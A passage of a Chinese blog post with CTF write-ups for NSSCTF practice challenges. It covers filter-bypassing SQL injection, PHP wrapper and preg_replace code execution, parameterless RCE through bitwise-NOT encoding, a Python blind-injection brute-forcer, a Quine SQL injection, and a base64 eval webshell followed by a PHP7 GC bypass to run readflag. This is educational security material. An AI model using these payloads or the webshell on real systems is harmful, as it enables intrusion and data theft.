<p>![](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;web学习笔记&#x2F;题集&#x2F;暑假题目&#x2F;暑假题目.assets&#x2F;[NSSRound%238 Basic]MyDoor解题截图.png)</p>
<p>直接ctrl+F找到flag的值</p>
<h2 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>相对安全的方式，就是POST方式了，并且告诉了我们参数是nss，尝试传参</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>很明显是假的flag</p>
<p>经判断，闭合方式为’，过滤了union，空格，information</p>
<p>我们开始爆库名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=2&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>爆表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=2&#x27;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>直接爆字段（一开始猜测flag在flll444g里面，但是很快发现不对）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=2&#x27;/**/ununionion/**/select/**/1,2,group_concat(Secr3t)/**/from/**/NSS_db.NSS_tb%23</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>成功拿到flag。</p>
<h2 id="BJDCTF-2020-ZJCTF，不过如此"><a href="#BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF 2020]ZJCTF，不过如此"></a>[BJDCTF 2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一步很简单，对于text变量，我们使用data协议直接写入一个新文件，而file变量直接利用伪协议进行读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://ta/a,I%20have%20a%20dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>

<p>得到题目next.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里涉及到php的正则逆向引用与子模式分析</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/miketwais/p/php_preg.html">php正则逆向引用与子模式分析 - MasonZhang - 博客园 (cnblogs.com)</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BBJDCTF%202020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>ctrl+F找到flag：</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BBJDCTF%202020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<h2 id="鹏城杯-2022-简单的php"><a href="#鹏城杯-2022-简单的php" class="headerlink" title="[鹏城杯 2022]简单的php"></a>[鹏城杯 2022]简单的php</h2><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>明显是无参RCE，</p>
<p>发现可以使用取反绕过：</p>
<p>这里说说无参RCE的常用函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、getallheaders()</span><br><span class="line">2、get_defined_vars()</span><br><span class="line">3、session_id()</span><br><span class="line"></span><br><span class="line">配套</span><br><span class="line">implode() 将一维数组转化为字符串</span><br><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end() 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回。</span><br><span class="line">array_reverse() 函数返回翻转顺序的数组。</span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin() — 转换十六进制字符串为二进制字符串。</span><br><span class="line">getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。</span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br></pre></td></tr></table></figure>

<p>然后就掏出我们的祖传脚本，目标命令是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(current(getallheaders()));</span><br></pre></td></tr></table></figure>

<p>为什么是这个呢，这个命令就是取所有的请求头存为数组，并取第一个的值进行命令执行，所以我们就需要在请求包的第一行添加一个值为我们想要执行的命令的请求头。</p>
<p>分别用脚本跑出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system:(~%8C%86%8C%8B%9A%92)</span><br><span class="line">current:(~%9C%8A%8D%8D%9A%91%8B)</span><br><span class="line">getallheaders:(~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)</span><br></pre></td></tr></table></figure>

<p>将他们拼接起来即可，还有就是要用[!%FF]分开</p>
<p>最终payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())); </span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%8F%E5%9F%8E%E6%9D%AF%202022%5D%E7%AE%80%E5%8D%95%E7%9A%84php%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>成功拿到flag。</p>
<h2 id="NISACTF-2022-hardsql"><a href="#NISACTF-2022-hardsql" class="headerlink" title="[NISACTF 2022]hardsql"></a>[NISACTF 2022]hardsql</h2><p>这道题其实就是Quine注入，关于payload的构造，参考这位大神的文章：</p>
<p>[(7条消息) Quine-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_74426248/article/details/131897797?spm=1001.2014.3001.5502">第五空间 2021]yet_another_mysql_injection_qq_74426248的博客-CSDN博客</a></p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dhardsql%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>题目一进去是一个登录界面，hint里面有用户，但我们需要爆破出密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;http://1.14.71.254:28279/login.php&#x27;</span><br><span class="line">dict = &#x27;0123456789qwertyuiopasdfghjklzxcvbnm-&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for j in range(50):</span><br><span class="line">    for i in dict:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;username&quot;:&quot;bilala&quot;,</span><br><span class="line">            &quot;passwd&quot;:f&quot;1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;flag+i&#125;%&#x27;#&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        if &quot;nothing found&quot; not in res.text:</span><br><span class="line">            flag=flag+i</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆破出密码为b2f2d15b3ae082ca29697d8dcd420fd7，我们进行登录，得到了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//多加了亿点点过滤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;waf here&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;bilala&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only bilala can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;nothing found&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>重点是这一段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if ($row[&#x27;passwd&#x27;] === $password) &#123;</span><br><span class="line">        if($password == &#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;)&#123;</span><br><span class="line">            show_source(__FILE__);</span><br><span class="line">            die;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die($FLAG);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>数据库中的passwd和输入的password一样，然后 password不等于b2f2d15b3ae082ca29697d8dcd420fd7才可以 die flag</p>
<p>这里拿到flag的条件就是密码不为b2f2d15b3ae082ca29697d8dcd420fd7且能登陆成功</p>
<p>题中还过滤了char，用chr或者直接0x代替即可。</p>
<p>0x、char、chr三个等价  </p>
<p>0x22,  双引号   char (34)     &#x3D;&#x3D;</p>
<p>0x27   单引号   char (39)    </p>
<p>相信有人纳闷，这道题为什么是%而不是.  因为 0x25是%的16进制改为</p>
<p>0x2e . 也是可以的<br>所以构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#&amp;login=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dhardsql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<h2 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h2><p>先看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure>

<p>可以看到我们传入的东西是会被base64解码一遍的，所以我们先尝试传参phpinfo();</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>成功执行了phpinfo()，但是我们发现有被禁用的太多了</p>
<p>那我们尝试进行上传一句话木马</p>
<p>eval($_POST[a]);编码之后是ZXZhbCgkX1BPU1RbYV0pOw&#x3D;&#x3D;</p>
<p>传参之后用蚁剑进行连接，连接成功之后进入查找</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>在根目录下发现了flag打开是空的，那我们看看readflag吧</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>无法读取，但我们猜想是通过readflag来读取flag文件</p>
<p>上网看看，通过phpinfo()知道php版本为7.3，这个版本有一个漏洞<br>php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令<br>影响范围是linux，php7.0-7.3<br>给出了exp<br><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>下载后进行修改，改为执行readflag</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>现在攻击文件准备好了，该上传到哪里呢：</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<p>我们发现tmp文件夹的权限是777，什么都可以做，就把攻击的php上传到那里去吧</p>
<p>然后通过之前上传的一句话来包含攻击文件</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png" class>

<p>成功拿到flag。</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" rel="prev" title="DC3-4靶机复现">
                  <i class="fa fa-chevron-left"></i> DC3-4靶机复现
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" rel="next" title="DC5-6靶机复现">
                  DC5-6靶机复现 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
